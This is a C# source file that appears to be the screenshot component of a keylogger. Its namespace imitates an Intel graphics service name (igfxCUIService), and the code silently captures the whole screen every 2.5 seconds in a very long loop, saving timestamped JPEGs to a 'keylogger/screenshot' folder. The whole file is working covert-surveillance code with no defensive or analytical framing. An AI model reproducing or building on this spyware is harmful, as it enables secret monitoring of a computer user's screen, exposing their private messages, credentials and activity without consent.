using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;

namespace igfxCUIService
{
    class screenshots
    {
        #region[screenshots]

        #region[variable]
        private static DateTime datum = DateTime.Now;
        private static decimal hour;
        private static decimal minuten;
        private static decimal seconde;
        #endregion

        #region [ aantal screenshots]
        public static void aantalscreenshots()
        {
            for (int i = 0; i < 500000000; i++)
            {


                DateTime TimeNow = DateTime.Now;
                hour = TimeNow.Hour;
                minuten = TimeNow.Minute;
                seconde = TimeNow.Second;
                printscreen();
            }
        }

        #endregion

        #region [printscreens]
        private static void printscreen()
        {
            Thread.Sleep(2500);
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                string folderName = @"D:/keylogger/screenshot/";
                string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
                System.IO.Directory.CreateDirectory(pathString);
                bitmap.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);


            }
        }

        #endregion

        #endregion
    }
}
